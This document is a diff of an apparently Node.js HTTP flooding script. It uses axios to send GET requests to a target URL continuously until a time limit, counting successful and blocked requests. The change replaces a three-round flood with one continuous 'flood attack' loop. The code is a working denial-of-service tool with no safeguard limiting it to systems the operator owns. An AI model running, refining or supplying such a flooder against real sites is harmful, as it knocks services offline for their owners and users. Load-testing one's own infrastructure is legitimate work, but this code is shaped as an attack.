@@ -19,10 +19,10 @@ if (isNaN(durationInMs) || durationInMs <= 0) {
 let totalRequests = 0;
 let successfulRequests = 0;
 let blockedRequests = 0;
-let startTime = Date.now();
-let stopTime = startTime + durationInMs;
 let peakRps = 0;
 let lastRequestsCount = 0;
+let startTime = Date.now();
+let stopTime = startTime + durationInMs;
 
 // Function to send HTTP requests
 const sendRequest = async () => {
@@ -30,7 +30,6 @@ const sendRequest = async () => {
     const response = await axios.get(targetUrl);
     successfulRequests++;
   } catch (error) {
-    // Ignore the error, continue flooding the target
     blockedRequests++;
   }
 
@@ -64,30 +63,18 @@ Time Remaining: ${Math.ceil(remainingTime / 1000)}s
 };
 
 // Function to perform the flooding attack
-const performFlood = (round = 1) => {
-  // Only run 3 times
-  if (round > 3) {
-    console.log('\nFlood test completed.');
-    return;
-  }
-
-  console.log(`\nStarting flood round ${round}...`);
-
-  // Update the start and stop time for the current round
-  startTime = Date.now();
-  stopTime = startTime + durationInMs;
-
-  const interval = setInterval(() => {
+const performFlood = () => {
+  console.log('Starting flood attack...');
+  
+  // Flooding continuously without delay
+  const floodInterval = setInterval(() => {
     if (Date.now() > stopTime) {
-      clearInterval(interval); // Stop after the time limit is reached
-      console.log(`\nRound ${round} completed.`);
-      
-      // Move on to the next round
-      performFlood(round + 1);
+      clearInterval(floodInterval); // Stop after the time limit is reached
+      console.log('\nFlood test completed.');
       return;
     }
 
-    // Send requests as quickly as possible, ignoring errors
+    // Send requests continuously
     sendRequest();
 
     // Update live stats every 100ms
